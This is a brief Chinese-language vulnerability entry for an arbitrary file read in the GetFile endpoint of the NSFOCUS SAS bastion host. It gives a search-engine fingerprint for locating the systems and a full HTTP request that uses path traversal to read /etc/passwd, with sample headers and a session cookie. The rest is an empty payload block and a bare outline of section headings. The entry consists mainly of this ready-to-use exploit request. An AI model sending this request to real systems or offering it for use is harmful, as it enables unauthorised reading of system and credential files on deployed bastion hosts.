# 绿盟SAS堡垒机GetFile任意文件读取漏洞

- **系统**：绿盟SAS堡垒机GetFile　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="NSFOCUS 绿盟 SAS"`
- **请求**：`GET /webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: PHPSESSID=4d44c08bdf4492b7877f79ffa7122d3c`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```

```

**其他**
- 绿盟SAS堡垒机GetFile任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 绿盟SAS堡垒机